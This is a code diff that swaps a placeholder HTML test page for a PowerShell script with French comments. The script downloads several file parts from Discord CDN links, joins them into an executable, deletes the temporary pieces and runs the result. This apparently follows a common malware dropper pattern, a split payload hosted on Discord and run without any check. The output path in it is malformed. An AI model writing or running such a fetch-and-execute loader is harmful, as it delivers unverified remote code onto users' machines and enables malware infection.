@@ -1,12 +1,56 @@
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <div>
-        Test github adhzqudyfhzq
-    </div>
-</body>
-</html>
+# Récupère les différentes parties d'un fichier depuis des liens Discord (ou autres URLs)
+# Assemble les fichiers en un fichier final, et exécute ce fichier si besoin.
+
+# Liste des URLs à télécharger (ajoutez vos liens Discord ici)
+$urls = @(
+    "https://cdn.discordapp.com/attachments/serverID/part1",
+    "https://cdn.discordapp.com/attachments/serverID/part2",
+    "https://cdn.discordapp.com/attachments/serverID/part3"
+)
+
+# Nom du fichier final après assemblage
+$outputFile = "$env:C:\Users\Sano\Desktop\new-project\download.exe"
+
+# Nom des fichiers temporaires
+$tempFiles = @()
+
+# Téléchargement des parties
+Write-Host "Téléchargement des parties..."
+foreach ($index in 0..($urls.Count - 1)) {
+    $url = $urls[$index]
+    $tempFile = "$env:TEMP\part$($index + 1).tmp"
+    $tempFiles += $tempFile
+
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
+        Write-Host "Téléchargé : $url"
+    } catch {
+        Write-Host "Erreur lors du téléchargement : $url"
+        exit 1
+    }
+}
+
+# Assemblage des parties
+Write-Host "Assemblage des fichiers..."
+Try {
+    $fs = [System.IO.File]::Create($outputFile)
+    foreach ($tempFile in $tempFiles) {
+        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
+        $fs.Write($bytes, 0, $bytes.Length)
+    }
+    $fs.Close()
+    Write-Host "Fichier assemblé : $outputFile"
+} catch {
+    Write-Host "Erreur lors de l'assemblage des fichiers."
+    exit 1
+}
+
+# Suppression des fichiers temporaires
+Write-Host "Suppression des fichiers temporaires..."
+foreach ($tempFile in $tempFiles) {
+    Remove-Item -Path $tempFile -Force
+}
+
+# Exécution du fichier final
+Write-Host "Exécution du fichier assemblé..."
+Start-Process $outputFile
